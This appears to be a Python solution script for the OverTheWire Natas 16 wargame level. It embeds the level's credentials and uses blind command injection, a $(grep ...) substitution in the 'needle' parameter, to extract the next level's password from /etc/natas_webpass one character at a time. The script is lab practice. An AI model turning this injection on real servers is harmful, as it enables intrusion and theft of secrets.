#!/usr/bin/python
import httplib
import urllib
import base64
import requests

password = ''
possibleChars = '8abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

headers = {}
http_username = "natas16"
http_password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
url = "http://%s:%s@natas16.natas.labs.overthewire.org/index.php?" % (http_username, http_password)


while len(password) < 32:
    found = False
    for ch in possibleChars:
        data = {'needle': "$(grep -E ^%s%s.* /etc/natas_webpass/natas17)affixed" % (password,ch)}

        r = requests.get(url, params=data)
        data = r.text
        if r.status_code != 200:
            print "Server returned error!"
            print data
            break

        if 'affixed' not in data:
            password = password + ch
            print password
            found = True
            break

    if found == False:
        print "Error while searching! Nothing found!"
        break

print "Password: %s" % password
